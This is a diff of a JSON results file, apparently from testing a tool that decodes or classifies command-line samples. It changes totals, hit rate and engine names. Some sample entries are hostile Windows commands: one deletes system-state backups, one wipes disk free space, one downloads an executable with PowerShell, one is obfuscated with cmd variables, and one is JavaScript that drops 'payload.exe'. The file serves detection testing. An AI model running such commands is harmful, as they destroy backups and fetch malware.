@@ -1,7 +1,7 @@
 {
-  "total": 105,
+  "total": 110,
   "passed": 35,
-  "hit_rate": 0.3333,
+  "hit_rate": 0.3182,
   "threshold": 0.6,
   "results": [
     {
@@ -45,9 +45,9 @@
     },
     {
       "sha1": "70db2df97b3e88c66c50ef9df98dc51de491cc7d",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
-      "output_head": "hello",
+      "output_head": "aGVsbG8=",
       "ok": false
     },
     {
@@ -293,14 +293,14 @@
     },
     {
       "sha1": "113cea36a6da4c4bc8627039b4f3d067aca2c4e1",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
       "output_head": "import numpy as np\ndata = np.zeros((10, 10))",
       "ok": false
     },
     {
       "sha1": "ea55504afa6416b4f4b89ac4cc386c575f00929a",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
       "output_head": "192.168.1.1 is on the LAN \u2014 safe internal address",
       "ok": false
@@ -316,30 +316,30 @@
     },
     {
       "sha1": "2aae6c35c94fcfb415dbe95f408b9ce91ee846ed",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
       "output_head": "hello world",
       "ok": false
     },
     {
       "sha1": "c7a19cb10c70666f0a4299b85692e11b6c8b2f1b",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
       "output_head": "wbadmin delete systemstatebackup -keepversions:0",
       "ok": false
     },
     {
       "sha1": "eb32fe579f52b910a0bcb15c09d78747b6d0e34f",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
       "output_head": "cipher /w:C:\\",
       "ok": false
     },
     {
       "sha1": "1584af34536103c086f163f599640acbb9f26155",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
-      "output_head": "cmd /c \"whoami && netstat -ano\"",
+      "output_head": "set \"A=cmd\" && set \"B=/c \" && set \"C=whoami && netstat -ano\" && %A% %B% \"%C%\"",
       "ok": false
     },
     {
@@ -360,14 +360,14 @@
     },
     {
       "sha1": "f18d46780fda16ff0927300bdc7cd4f7112bf2da",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
-      "output_head": "print(1+1)",
+      "output_head": "python -c 'print(1+1)'",
       "ok": false
     },
     {
       "sha1": "1b42e8db26f7d6de7901f6f19c7ee61de4b11df9",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
       "output_head": "notepad readme.txt",
       "ok": false
@@ -416,9 +416,9 @@
     },
     {
       "sha1": "f9f75777c6ec5ce767f90a3564eba599398a4d58",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
-      "output_head": "binary-A",
+      "output_head": "var d='YmluYXJ5LUE='; var b=atob(d); var l=document.createElement('a'); l.download='payload.exe'; l.href=URL.createObjec",
       "ok": false
     },
     {
@@ -659,14 +659,14 @@
     },
     {
       "sha1": "be4fa6d6a87306122c662701c212ab69662fa969",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
       "output_head": "Get-Process | Where-Object CPU -gt 100",
       "ok": false
     },
     {
       "sha1": "39bc5cb078aa6a4cad06e89db720ca25bb54f6b5",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
       "output_head": "schtasks /query /fo LIST /v",
       "ok": false
@@ -718,105 +718,105 @@
     },
     {
       "sha1": "566b78692dc51d1927650a5bbaad8c507388c0aa",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
       "output_head": "\"C:\\Program Files (x86)\\Kodak\\Prinergy Evo 9.0.0.0\\bin\\JFloatLicMgrD.exe\" -c",
       "ok": false
     },
     {
       "sha1": "de6c8bd5d224bc6e8eac248ae887cda63f4a6c5c",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
       "output_head": "Write-Host \"Hello, world\"",
       "ok": false
     },
     {
       "sha1": "4233fb8417a5278a07306a7704110ef2a0d5a1d8",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
       "output_head": "--runaszvideo=TRUE\n    --useroption=2347222064534913024\n    --useroption2=1152956688981395520\n    --useroption3=69176006",
       "ok": false
     },
     {
       "sha1": "9ea26a3711c1c10b506157a14833c46840544ce5",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
       "output_head": "--runaszvideo=TRUE\n    --useroption=2347222064534913024\n    --useroption2=1152956688981395520\n    --haszoomim=1",
       "ok": false
     },
     {
       "sha1": "157fa2cf7908b959ec6cae7b4ca0e8463f2777c3",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
       "output_head": "--runaszvideo=TRUE --useroption=2347222064534913024 --useroption2=1152956688981395520 --useroption3=6917600633341970944 ",
       "ok": false
     },
     {
       "sha1": "edf427c8eadff87348a1965681f7d5348c68a601",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
       "output_head": "FuturePrint\\Windows\\menu\\menu_En.exe x64",
       "ok": false
     },
     {
       "sha1": "4514cea4027c959ea08982e1d1bad05af56e1adb",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
       "output_head": "# vendor=Cisco XDR\nevent[0] host=AZG51 user=User path=menu_En.exe detection=Alert threat=high",
       "ok": false
     },
     {
       "sha1": "bd907aa2280549494055de165f6230d94ce69af1",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
       "output_head": "just some text",
       "ok": false
     },
     {
       "sha1": "2dbb56915aff141470bfa3346d468e40a514f5fe",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
       "output_head": "test 12345",
       "ok": false
     },
     {
       "sha1": "5d0e284372faf08e9d483f6fa208e7110fe8e2fd",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
       "output_head": "powershell -c \"Invoke-WebRequest -Uri http://8.8.8.8/x -OutFile a.exe\"",
       "ok": false
     },
     {
       "sha1": "abe8fc0b05effd3fd219bb44f6400e9c2bc1048c",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
       "output_head": "powershell -c \"Invoke-WebRequest -Uri http://8.8.8.8/a -OutFile a.exe\"",
       "ok": false
     },
     {
       "sha1": "eff48a804a64094c59a678ca55f96a198a9a30cf",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
       "output_head": "Get-Process | Where-Object { $_.CPU -gt 100 }",
       "ok": false
     },
     {
       "sha1": "3ddb8ca1b50e240736bb4b86fdff00ffc79d8c47",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
       "output_head": "ipconfig /all",
       "ok": false
     },
     {
       "sha1": "1e496735e9224be745ac5c094245888cb37c546c",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
       "output_head": "# vendor=CrowdStrike Falcon\nevent[0] host=WKST-014 user=corp\\jdoe detection=DetectionSummaryEvent",
       "ok": false
     },
     {
       "sha1": "23378e603f5a4d362d80e25c8bfacaf8b39d6ac6",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
       "output_head": "# vendor=Cisco Secure Endpoint\nevent[0] user=alice",
       "ok": false
@@ -861,149 +861,184 @@
     },
     {
       "sha1": "8fadfc0c1658c3abcf41e97baffd9bbf814cbe6e",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
       "output_head": "Write-Host \"tweet, tweet!\"",
       "ok": false
     },
     {
       "sha1": "45d9ad0e642c0330e9a166e3dde24d650955a3b1",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
-      "output_head": "Hello",
+      "output_head": "powershell -enc SGVsbG8=",
       "ok": false
     },
     {
       "sha1": "7b1cb5e0614b14bb2bd93873d9f89f63aaa4f812",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
       "output_head": "TEST_iter63_1785867328 nivxray unique payload",
       "ok": false
     },
     {
       "sha1": "a9373fa4ce435cd73ef0034b5d4f8ec4971355c0",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
       "output_head": "TEST_iter63_1785867519 nivxray unique payload",
       "ok": false
     },
     {
       "sha1": "208bf536747f6fb23dcbc67bf4d82dee87ac8c4c",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
       "output_head": "TEST_iter63_1785894391 nivxray unique payload",
       "ok": false
     },
     {
       "sha1": "48fb3e5aff86c567a24f2dfaafb955ca3d6b5281",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
       "output_head": "TEST_iter63_1785928267 nivxray unique payload",
       "ok": false
     },
     {
       "sha1": "5d56b30a006017e85990ea0cb3f00e199a048edd",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
       "output_head": "TEST_iter63_1785929890 nivxray unique payload",
       "ok": false
     },
     {
       "sha1": "b35757d435e60cd49f380fe2a88acaa696173bb7",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
       "output_head": "TEST_iter63_1785997178 nivxray unique payload",
       "ok": false
     },
     {
       "sha1": "7a4e15af8ef0ecb3430c2891554ef296f1adbcbb",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
       "output_head": "TEST_iter63_1786019726 nivxray unique payload",
       "ok": false
     },
     {
       "sha1": "a783237740d9543c747b3d6cb11cd40dbba81510",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
       "output_head": "TEST_iter63_1786020098 nivxray unique payload",
       "ok": false
     },
     {
       "sha1": "3ea67469101bc5084123b64fe9079f513e191419",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
       "output_head": "TEST_iter63_1786108287 nivxray unique payload",
       "ok": false
     },
     {
       "sha1": "92e70901f74cadb5202836fe84bca62218ee43b1",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
       "output_head": "TEST_iter63_1786133908 nivxray unique payload",
       "ok": false
     },
     {
       "sha1": "44a1d2c51e93a710d9efff0b6386f63be087515e",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
       "output_head": "TEST_iter63_1786135830 nivxray unique payload",
       "ok": false
     },
     {
       "sha1": "6d3583a64f65e5644014fdaf2dcf718bc016d788",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
       "output_head": "TEST_iter63_1786170122 nivxray unique payload",
       "ok": false
     },
     {
       "sha1": "471495f906adcbba2efad091f784495db3aaa984",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
       "output_head": "TEST_iter63_1786170808 nivxray unique payload",
       "ok": false
     },
     {
       "sha1": "4cf84dba3e2dd14163f7b088c349b98ca19a055a",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
       "output_head": "TEST_iter63_1786193971 nivxray unique payload",
       "ok": false
     },
     {
       "sha1": "a61040c01ceac67a440a371f1bac3cfa1018462d",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
       "output_head": "TEST_iter63_1786247229 nivxray unique payload",
       "ok": false
     },
     {
       "sha1": "d616a3955ddfb8b0a4a8c83807a7970fc68c3deb",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
       "output_head": "TEST_iter63_1786264337 nivxray unique payload",
       "ok": false
     },
     {
       "sha1": "08682e2b70354a7096180dadbe85a3f4daf4175f",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
       "output_head": "TEST_iter63_1788290124 nivxray unique payload",
       "ok": false
     },
     {
       "sha1": "be71a74a9c7c2eadf35d9b61315d182427b3e41e",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
       "output_head": "TEST_iter63_1788592860 nivxray unique payload",
       "ok": false
     },
     {
       "sha1": "7e334f39879ebb7df0341179ff26d17f8b31bd81",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
       "output_head": "TEST_iter63_1788593456 nivxray unique payload",
+      "ok": false
+    },
+    {
+      "sha1": "fa105378c311f9d656a7fabc47aa5dcc7c2770d8",
+      "engine": "magic",
+      "chain": [],
+      "output_head": "TEST_iter63_1789401150 nivxray unique payload",
+      "ok": false
+    },
+    {
+      "sha1": "aac3cc338e2c9123ee1d55f27a88293357944287",
+      "engine": "magic",
+      "chain": [],
+      "output_head": "TEST_iter63_1789401406 nivxray unique payload",
+      "ok": false
+    },
+    {
+      "sha1": "586fe642cdd4e7c9431d4c2f6333609e035afa1e",
+      "engine": "magic",
+      "chain": [],
+      "output_head": "TEST_iter63_1789402269 nivxray unique payload",
+      "ok": false
+    },
+    {
+      "sha1": "b0ab4b547cb06b2f35fc7597b10cf997361a3b64",
+      "engine": "magic",
+      "chain": [],
+      "output_head": "TEST_iter63_1789402636 nivxray unique payload",
+      "ok": false
+    },
+    {
+      "sha1": "f1ab7463231422bbc438bd9dd52abcf83d05ae9b",
+      "engine": "magic",
+      "chain": [],
+      "output_head": "TEST_iter63_1789806395 nivxray unique payload",
       "ok": false
     }
   ]
